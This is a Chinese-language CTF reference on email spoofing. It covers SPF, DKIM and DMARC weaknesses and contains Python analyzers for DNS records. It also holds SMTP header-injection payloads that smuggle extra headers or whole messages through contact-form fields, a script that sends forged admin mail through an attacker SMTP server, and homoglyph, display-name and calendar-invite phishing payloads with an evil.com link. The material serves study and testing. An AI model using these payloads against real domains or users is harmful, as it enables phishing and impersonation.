# 邮件伪造与 SPF / DKIM / DMARC

## 场景

目标域名缺乏正确配置的邮件认证机制，攻击者可以伪造来自该域名的邮件。CTF 中利用邮件伪造可能是获取内部系统访问入口的第一步: 伪造管理员的密码重置邮件、伪造内部系统的通知邮件、绕过基于邮件域的信任检查。掌握 SPF、DKIM、DMARC 三种认证机制的缺陷及其组合绕过是邮件攻击的核心技能。

## 输入信号

```
目标域名的 SPF 记录缺失或配置为 ?all / ~all (软失败)
目标域名的 SPF 记录允许大量 include: 或 ip4: 范围
目标域名的 DKIM 记录缺失 (无 _domainkey TXT 记录)
目标域名的 DKIM 使用弱密钥 (少于 1024 位 RSA) 或无密钥
目标域名的 DMARC 记录为 p=none 或 p=quarantine
目标域名使用第三方邮件发送服务 (SendGrid/Mailgun/SES) 但未严格限制
目标域名的 MX 记录指向的服务器不验证入站邮件
目标网站存在表单发送邮件功能 (contact.php) → SMTP header injection
目标网站存在 .ics 日历文件生成功能 → 日历注入钓鱼
```

## 1. SPF 机制深度剖析

### SPF 语法与常见缺陷

```bash
# SPF 记录语法 (TXT 记录, 不能使用 SPF RR type):
# v=spf1 [mechanisms] [modifiers]

# 常用机制:
# +all     → 允许所有 IP 发送 (最危险)
# -all     → 拒绝所有非授权 IP (最安全)
# ~all     → 软失败 (接受但标记 — 很多接收方仍接受)
# ?all     → 中立 (不表态)
# ip4:1.2.3.4 → 允许指定 IPv4
# ip6:::1 → 允许指定 IPv6
# include:example.com → 包含另一域名的 SPF 策略
# a         → 允许该域名的 A 记录 IP
# mx        → 允许该域名的 MX 记录 IP
# ptr       → 允许 PTR 反向查询匹配的 IP (已弃用, 开销大)

# 常见配置错误:
# v=spf1 include:spf.example.com ~all
#   → include 链过长 → SPF 查询超过 10 次 DNS 查找限制 → 忽略

# v=spf1 ip4:0.0.0.0/0 ?all
#   → 全 0 子网覆盖所有 IP → 实际上允许所有

# v=spf1 include:_spf.google.com ~all
#   → 使用 Google 的 SPF 但目标并非 Google 客户
#   → Google 的 include 被删除后 → SPF 失效
```

```python
# spf_analyzer.py — SPF 记录解析与缺陷扫描
import dns.resolver
from typing import List, Dict

class SPFAnalyzer:
    """SPF 记录分析器"""
    
    def __init__(self, domain: str):
        self.domain = domain
        self.spf_record = None
        self.mechanisms = []
    
    def fetch_spf(self) -> str:
        """获取域名的 SPF 记录"""
        try:
            answers = dns.resolver.resolve(self.domain, 'TXT')
            for rdata in answers:
                txt = ' '.join([s.decode() if isinstance(s, bytes) else s for s in rdata.strings])
                if txt.startswith('v=spf1'):
                    self.spf_record = txt
                    return txt
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            pass
        return None
    
    def parse_spf(self) -> List[Dict]:
        """解析 SPF 机制的漏洞信号"""
        if not self.spf_record:
            return [{'severity': 'CRITICAL', 'issue': 'No SPF record'}]
        
        findings = []
        parts = self.spf_record.split()
        
        # 检查 all 机制
        all_mech = [p for p in parts if p.endswith('all')]
        if all_mech:
            mechanism = all_mech[0]
            if mechanism == '+all' or mechanism == 'all':
                findings.append({
                    'severity': 'CRITICAL',
                    'issue': 'SPF +all — 任何服务器都可以伪造该域名'
                })
            elif mechanism == '~all':
                findings.append({
                    'severity': 'MEDIUM',
                    'issue': 'SPF ~all — 软失败，很多接收方仍接受伪造邮件'
                })
            elif mechanism == '?all':
                findings.append({
                    'severity': 'HIGH',
                    'issue': 'SPF ?all — 中立，不阻止任何伪造'
                })
            elif mechanism == '-all':
                findings.append({
                    'severity': 'INFO',
                    'issue': 'SPF -all — 合理配置，但 DMARC 仍需检查'
                })
        
        # 检查 include: 链深度
        includes = [p for p in parts if p.startswith('include:')]
        if len(includes) >= 5:
            findings.append({
                'severity': 'HIGH',
                'issue': f'SPF 包含 {len(includes)} 个 include，DNS 查询可能超 10 次限制'
            })
        
        # 检查过宽的 ip4 范围
        for p in parts:
            if p.startswith('ip4:') and '/' in p:
                _, cidr = p.split('/')
                prefix = int(cidr)
                if prefix <= 8:  # 允许了上千万 IP
                    findings.append({
                        'severity': 'HIGH',
                        'issue': f'SPF ip4 范围过宽: {p}'
                    })
        
        return findings
    
    def check_include_chain(self) -> List[str]:
        """递归检查 include 链"""
        chain = [self.spf_record]
        visited = set()
        queue = [self.domain]
        
        while queue and len(visited) < 10:
            domain = queue.pop(0)
            if domain in visited:
                continue
            visited.add(domain)
            
            try:
                answers = dns.resolver.resolve(domain, 'TXT')
                for rdata in answers:
                    txt = ''.join([s.decode() if isinstance(s, bytes) else s for s in rdata.strings])
                    if txt.startswith('v=spf1'):
                        chain.append(f"{domain}: {txt[:100]}...")
                        for part in txt.split():
                            if part.startswith('include:'):
                                queue.append(part[8:])
            except:
                chain.append(f"{domain}: UNRESOLVABLE")
        
        return chain
```

### SPF 绕过技术

```bash
# 绕过 1: include 链中的过期域名
# target.com 有: v=spf1 include:mailchimp.com ~all
# 如果 mailchimp.com 的 SPF 被更新或删除
# → 攻击者注册 mailchimp.com (如果可能) → 控制 SPF

# 绕过 2: include 链走第三方宽松策略
# v=spf1 include:_spf.google.com ~all
# → 任何 Google Workspace 用户都可以代表 target.com 发送
# → 攻击者注册 Google Workspace → 在 Gmail 中配置自定义 "From:" 头

# 绕过 3: SPF redirect 机制滥用
# v=spf1 redirect=spf.example.com
# → spf.example.com 的 SPF 策略被完全继承
# → 如果 spf.example.com 是宽松的 → 绕过

# 绕过 4: 开放式中继 + SPF pass
# 如果攻击者拥有一个 ip4: 在 SPF 白名单中的服务器
# → 直接通过该服务器发送伪造邮件 → SPF pass
```

## 2. DKIM 深度剖析

### DKIM 密钥与签名机制

```bash
# DKIM 记录存储在: {selector}._domainkey.{domain}
# TXT 记录格式:
# v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC...

# 漏洞 1: 弱密钥 (< 1024 位 RSA)
# 使用 openssl 解析公钥:
# openssl pkey -pubin -in key.pem -text -noout
# 检查 key size
# 512 位 RSA → 可以在云服务上 (AWS) 几天内破解
# 768 位 RSA → 理论可破解但成本高
# 1024 位 RSA → 当前安全但不再推荐

# 漏洞 2: 无密钥 DKIM (k= 不指定算法)
# → 签名无法验证 → 接收方无法验证 DKIM

# 漏洞 3: 密钥被泄露到公开仓库
# 搜索 GitHub: selector._domainkey.domain.com
# 用 git dorks: DKIM private key filename

# 漏洞 4: l= 标签滥用 (body length)
# DKIM 签名可以只签 body 的一部分:
# l=100 → 只验证前 100 字节
# 攻击者可在第 101 字节后附加任意内容
# 邮件客户端只显示前面的合法内容，但后续恶意内容也可渲染

# 漏洞 5: t=y 测试模式
# t=y → 签名处于测试模式 → 接收方可能忽略 DKIM 失败
```

```python
# dkim_analyzer.py — DKIM 配置分析器
import dns.resolver
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

class DKIMAnalyzer:
    """DKIM 配置与密钥强度分析"""
    
    COMMON_SELECTORS = [
        'default', 'google', 'selector1', 'selector2',
        'dkim', 'mail', 'email', 'zoho',
        'smtp', 'mx', 'sparkpost', 'mailgun',
        'sendgrid', 's1', 's2', 'k1', 'k2',
        '2020', '2021', '2022', '2023', '2024',
        'protonmail', 'outlook', 'office365',
    ]
    
    def __init__(self, domain):
        self.domain = domain
        self.findings = []
    
    def enumerate_selectors(self):
        """枚举常见 DKIM selector"""
        for selector in self.COMMON_SELECTORS:
            dkim_domain = f"{selector}._domainkey.{self.domain}"
            try:
                answers = dns.resolver.resolve(dkim_domain, 'TXT')
                for rdata in answers:
                    txt = ''.join([s.decode() if isinstance(s, bytes) else s for s in rdata.strings])
                    if 'v=DKIM1' in txt:
                        self.findings.append({
                            'selector': selector,
                            'record': txt,
                        })
            except:
                continue
        return self.findings
    
    def check_key_strength(self, dkim_record):
        """检查 DKIM 公钥强度"""
        # 提取 p= 值
        import re
        p_match = re.search(r'p=([A-Za-z0-9+/=]+)', dkim_record)
        if not p_match:
            return {'error': 'No public key found'}
        
        key_bytes = base64.b64decode(p_match.group(1))
        
        # 尝试解析 RSA public key
        try:
            public_key = serialization.load_der_public_key(key_bytes)
            if isinstance(public_key, rsa.RSAPublicKey):
                key_size = public_key.key_size
                if key_size < 1024:
                    return {'severity': 'CRITICAL', 'issue': f'DKIM key size: {key_size} bits (TOO WEAK)'}
                elif key_size < 2048:
                    return {'severity': 'MEDIUM', 'issue': f'DKIM key size: {key_size} bits (acceptable but not recommended)'}
                else:
                    return {'severity': 'INFO', 'issue': f'DKIM key size: {key_size} bits (secure)'}
        except:
            # Ed25519 或其他算法
            return {'severity': 'INFO', 'issue': 'Non-RSA key (may be secure)'}
    
    def check_l_tag_abuse(self, dkim_record):
        """检查是否使用了 l= 标签"""
        if ' l=' in dkim_record or dkim_record.startswith('l='):
            return {'severity': 'HIGH', 'issue': 'DKIM l= tag present — vulnerable to body injection'}
        return None
```

## 3. DMARC 深度剖析

### DMARC 策略分析

```python
# dmarc_analyzer.py — DMARC 配置与攻击面

def analyze_dmarc(domain):
    """获取并分析 DMARC 记录"""
    try:
        answers = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
        dmarc_record = ''.join([s.decode() for s in answers[0].strings])
        
        findings = {}
        
        # 提取 p= (policy)
        if 'p=none' in dmarc_record:
            findings['policy'] = 'CRITICAL: p=none — 不阻止任何伪造邮件'
        elif 'p=quarantine' in dmarc_record:
            findings['policy'] = 'MEDIUM: p=quarantine — 伪造邮件进垃圾箱'
        elif 'p=reject' in dmarc_record:
            findings['policy'] = 'INFO: p=reject — 最佳实践'
        
        # 提取 pct= (percentage)
        import re
        pct_match = re.search(r'pct=(\d+)', dmarc_record)
        if pct_match:
            pct = int(pct_match.group(1))
            if pct < 100:
                findings['pct'] = f'MEDIUM: pct={pct}% — 只有 {pct}% 的邮件被应用策略'
        
        # 提取 rua/ruf (reporting)
        if 'rua=' not in dmarc_record:
            findings['reporting'] = 'LOW: 无 DMARC 报告地址 — 无法监控伪造活动'
        
        # 提取 sp= (subdomain policy)
        if 'sp=' not in dmarc_record and 'p=reject' in dmarc_record:
            findings['subdomain'] = 'MEDIUM: 子域名未设置独立策略，继承主域 p=reject'
        
        # 检查 aspf (strict vs relaxed)
        if 'aspf=s' in dmarc_record:
            findings['aspf'] = 'INFO: SPF 严格对齐 (Header.From = MAIL.From)'
        else:
            findings['aspf'] = 'LOW: SPF 宽松对齐 — 允许子域名在 MAIL FROM 中'
        
        # 检查 adkim (strict vs relaxed)
        if 'adkim=s' in dmarc_record:
            findings['adkim'] = 'INFO: DKIM 严格对齐 (d=domain = Header.From)'
        else:
            findings['adkim'] = 'LOW: DKIM 宽松对齐 — 允许子域在 d= 中'
        
        return dmarc_record, findings
        
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
        return None, {'CRITICAL': 'No DMARC record — 无任何保护'}
```

## 4. p=none → p=reject 迁移攻击窗口

```python
# dmarc_migration_attack.py
# 场景: 目标刚刚从 p=none 切换到 p=reject
# 但许多邮件接收方 (Gmail/Outlook) 缓存 DMARC 记录:
# DNS TTL 缓存 → 最长可达 7 天（受记录的 TTL 值限制）

# 即使 p=reject 已发布，但:
# 1. 发送邮件的服务器可能 still 使用旧配置
# 2. DNS 缓存导致部分接收方仍使用 p=none
# 3. DKIM 签名可能尚未完全部署
# 4. 子域名可能未覆盖 p=reject

# 攻击窗口:
# - DNS TTL 期间: 约 1 小时到 7 天
# - 完全部署过渡期: 数周到数月
# - 子域名未配置独立 DMARC: 无限期

def estimate_attack_window(domain):
    """估算 DMARC 迁移的攻击窗口"""
    # 1. 获取当前 DMARC TTL
    try:
        answers = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
        dmarc_ttl = answers.rrset.ttl
    except:
        dmarc_ttl = 3600  # 默认 1 小时
    
    # 2. 检查 SPF 记录
    try:
        spf_answers = dns.resolver.resolve(domain, 'TXT')
        for r in spf_answers:
            txt = ''.join([s.decode() for s in r.strings])
            if 'v=spf1' in txt:
                if '~all' in txt or '?all' in txt:
                    # SPF 软失败 — DMARC 迁移期间也受影响
                    pass
    except:
        pass
    
    return {
        'dns_cache_seconds': dmarc_ttl,
        'dns_cache_hours': dmarc_ttl / 3600,
        'vulnerable': dmarc_ttl > 0,
    }
```

## 5. Display Name Spoofing vs Envelope Spoofing

```python
# display_name_spoof.py — 显示名伪造技术
# 即使 SPF/DKIM/DMARC 全部严格，仍可通过显示名绕过人眼

# 方法 1: 完全相同的显示名，不同邮件地址
# From: "管理员" <attacker@evil.com>
# → 邮件客户端只显示 "管理员" → 用户看不出异常

# 方法 2: 同域但不同用户
# From: "客服支持" <support@target.com>
# 如果 target.com 支持所有用户 (catch-all) → 可直接发送

# 方法 3: 子域名
# From: "管理员" <admin@mail.target.com>
# 如果 mail.target.com 不受 DMARC 保护

# 方法 4: 国际域名 (IDN) 同形字攻击
# From: "info" <inƒo@target.com>  (ƒ = U+0192)
# From: "info" <ínfó@target.com>  (带重音符号)

# 方法 5: 零宽字符
# From: "admin" <a\U+200Bdmin@target.com> (零宽空格)
# 有些邮件客户端不显示零宽字符 → 看起来是 admin

# 方法 6: 注释伪装
# From: "管理员" <admin@target.com> (RCPT TO: attacker@evil.com)
# SMTP 协议中 MAIL FROM 和 Header.From 是独立的
```

## 6. Reply-To Injection

```python
# reply_to_injection.py — Reply-To 头注入与邮件路由劫持

# 场景: target.com 发送通知邮件 "您收到一条新消息"
# 发件人: notifications@target.com
# 如果 target.com 没有在邮件中验证 Reply-To 头

# 攻击: 用户点击"回复" → 邮件发到 reply@evil.com
# 而不是通知系统

# 更危险: Reply-To + DMARC 绕过
# 1. 伪造来自 target.com 的邮件 (SPF/DKIM 通过?? 不通过也要)
# 2. DMARC p=none 或 ~all → 邮件送达
# 3. Reply-To 设置为 victim@target.com
# 4. 用户回复时 → 邮件发给同域的同用户 → 看起来像内部对话

# 邮件路由欺骗:
# X-Original-TO: victim@target.com
# 某些邮件系统使用 X-Original-To 来决定投递
# 攻击者可控制该头 → 邮件被路由到不同用户
```

## 7. SMTP Header Injection in Contact Forms

```python
# smtp_header_injection.py — 表单到邮件的 SMTP 注入
# 场景: 网站的 "联系我们" 表单发送邮件到 admin@target.com
# 表单参数未转义直接在邮件头中使用

# 漏洞代码 (PHP):
# $headers = "From: " . $_POST['email'] . "\r\n";
# mail($to, $subject, $body, $headers);

# 攻击 payload — 注入额外的邮件头:
# email 字段:
# attacker@evil.com\r\nBcc: victim1@evil.com,victim2@evil.com

# 更严重 — 注入完整的新邮件 (邮件拆分):
# email 字段:
# attacker@evil.com\r\n\r\n
# Subject: 这是新的邮件\r\n
# From: admin@target.com\r\n
# To: victims@evil.com\r\n
# \r\n
# 这是被注入的邮件正文...

# 限制: 现代 PHP 的 mail() 函数阻止额外的 \r\n (5.5+)
# 但 Perl/Python 的 sendmail 包装可能仍受影响

# 检测:
def test_smtp_injection(endpoint_url, param_name):
    """测试 SMTP 头注入"""
    payloads = [
        f"test@a.com\r\nCc: injected@attacker.com",
        f"test@a.com\nBcc: injected@attacker.com",
        f"test@a.com\r\n\r\nInjected body",
        f'"test@a.com" <test@a.com>\r\nX-Attacker: true',
    ]
    for payload in payloads:
        try:
            r = requests.post(endpoint_url, data={param_name: payload})
            # 检测响应差异或通过 webhook 验证
        except:
            pass
```

## 8. Calendar Invite (.ics) Abuse

```python
# ics_phishing.py — 日历文件注入钓鱼

# 场景: 网站生成 .ics 日历邀请文件供用户下载
# 如果 iCal 字段未正确转义 → 注入恶意事件

# iCal 攻击 payload:
# SUMMARY: 团队聚餐
# DESCRIPTION: 点击查看详情: <a href="https://evil.com/phish">确认参加</a>
# ATTENDEE: mailto:admin@target.com

# 更危险的攻击: AUTO 回复 + iCal
# 某些日历系统 (Outlook) 在收到 iCal 邀请时自动发送回复
# 如果 ATTENDEE 字段包含外部邮件 → 发送回复到该地址
# → 可用于侦察: 验证邮件地址是否活跃

# 日历注入的钓鱼痛点:
# 1. 日历通知看起来来自内部系统
# 2. 用户习惯性点"接受"而不是仔细检查
# 3. 日历事件可以包含恶意链接
# 4. 日历事件在移动设备上更容易被误信

# iCal CN (Common Name) 注入:
# CN: admin@target.com\r\nATTENDER:CN=evil@evil.com
# 某些实现可覆盖 CN 值
```

## 9. Automated Email Spoofing Test Suite

```python
# email_spoofing_suite.py — 完整邮件伪造测试套件

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr
import dns.resolver

class EmailSpoofTestSuite:
    """邮件伪造测试套件"""
    
    def __init__(self, target_domain, attacker_smtp_server):
        self.target_domain = target_domain
        self.smtp_server = attacker_smtp_server
        self.results = []
    
    def send_test_email(self, from_addr, to_addr, subject, body, headers=None):
        """发送测试邮件"""
        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject
        
        if headers:
            for k, v in headers.items():
                msg[k] = v
        
        msg.attach(MIMEText(body, 'plain'))
        
        try:
            with smtplib.SMTP(self.smtp_server, 25) as server:
                server.send_message(msg)
            return True
        except Exception as e:
            return False
    
    def test_spf_bypass(self, test_email):
        """测试 SPF 绕过"""
        # 测试 1: 直接伪造
        self.send_test_email(
            f'"Admin" <admin@{self.target_domain}>',
            test_email,
            '[SPF Test] Direct spoof',
            'SPF bypass test 1',
        )
        
        # 测试 2: 子域名
        self.send_test_email(
            f'"Support" <support@mail.{self.target_domain}>',
            test_email,
            '[SPF Test] Subdomain',
            'SPF bypass test 2',
        )
        
        # 测试 3: 非 ASCII 显示名
        self.send_test_email(
            f'"admin" <admin@evil.com>',
            test_email,
            '[SPF Test] Display name',
            'SPF bypass test 3',
            {'Reply-To': f'admin@{self.target_domain}'}
        )
    
    def test_dkim_bypass(self, test_email):
        """测试 DKIM 绕过"""
        # 如果目标 DKIM 使用了 l= 标签
        # 发送超过 l= 长度的邮件
        pass
    
    def test_dmarc_bypass(self, test_email):
        """测试 DMARC 绕过"""
        # 发送邮件到以下服务检查 DMARC 报告:
        # - Gmail: 查看原始邮件头中的 Authentication-Results
        # - Outlook: 查看 X-Forefront-Antispam-Report
        pass
```

## 10. SPF/DKIM/DMARC Validator

```python
# validate_email_auth.py — 综合邮件认证验证器

def comprehensive_email_auth_check(domain):
    """完整邮件认证配置检查"""
    import subprocess
    import json
    
    results = {
        'domain': domain,
        'spf': None,
        'dkim': [],
        'dmarc': None,
        'findings': [],
        'overall_score': 0,  # 0=最脆弱, 10=最安全
    }
    
    # SPF 检查
    spf = SPFAnalyzer(domain)
    results['spf'] = {
        'record': spf.fetch_spf(),
        'findings': spf.parse_spf(),
    }
    
    # 如果有 SPF +all → 0 分
    if any(f['severity'] == 'CRITICAL' for f in spf.parse_spf()):
        results['overall_score'] += 0
    elif spf.spf_record and '-all' in spf.spf_record:
        results['overall_score'] += 3
    
    # DKIM 检查
    dkim = DKIMAnalyzer(domain)
    selectors = dkim.enumerate_selectors()
    for sel in selectors:
        key_check = dkim.check_key_strength(sel['record'])
        results['dkim'].append({
            'selector': sel['selector'],
            'key_strength': key_check,
            'has_l_tag': dkim.check_l_tag_abuse(sel['record']),
        })
    
    if len(selectors) > 0:
        results['overall_score'] += 2  # 有 DKIM = 加分
    
    # DMARC 检查
    dmarc_record, dmarc_findings = analyze_dmarc(domain)
    results['dmarc'] = {
        'record': dmarc_record,
        'findings': dmarc_findings,
    }
    
    if dmarc_record:
        if 'p=reject' in dmarc_record:
            results['overall_score'] += 5
        elif 'p=quarantine' in dmarc_record:
            results['overall_score'] += 3
        else:
            results['overall_score'] += 1
    
    results['overall_assessment'] = (
        'HIGH RISK' if results['overall_score'] < 5
        else 'MEDIUM RISK' if results['overall_score'] < 8
        else 'LOW RISK'
    )
    
    return results
```

## 攻击链

```
SPF +all 或缺失 → 任意服务器伪造来源邮件 → DMARC p=none → 邮件全额送达
SPF ~all + DKIM 弱密钥 (512-bit) → 破解私钥 → 伪造带有效 DKIM 签名的邮件
DKIM l= tag → 只签名 body 前 100 字节 → 注入恶意内容到 body 尾部
DMARC p=none → 完全无保护 → SPF/DKIM 失败也不会阻止 → 最大伪造自由
DMARC p=quarantine + pct=50 → 只有一半伪造邮件被隔离 → 其余直接送达
Reply-To 注入 + 显示名伪造 → 受害者回复到攻击者控制的地址
SMTP header injection (contact form) → 向任意地址发送任意邮件
子域名无 DMARC → 子域名伪造 → 主域名 DMARC 无法覆盖
MX 指向过期邮件服务 → 注册同名服务 → 接收所有发往目标域的邮件
iCal 注入 → 日历钓鱼 → 日历邀请看起来来自内部系统
```

## 证据

记录: SPF 记录内容及解析结果、DKIM selector 枚举、DMARC 策略、发送的测试邮件样本 (from/to/header/body)、接收方邮件认证头 (Authentication-Results)、邮件是否到达收件箱/垃圾箱、DNS TTL 值。

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 域名 DNS 探测 | `http_probe` | HTTP GET 探测目标域的可访问性 |
| 邮件认证知识 | `kb_router` | 按 SPF/DKIM/DMARC 搜索相关知识 |
| 技术文件阅读 | `kb_read_file` | 读取具体邮件伪造代码示例 |
| 辅助工具 | `run_ctf_tool` | 使用 jwt_tool, dirsearch 等辅助探测 |
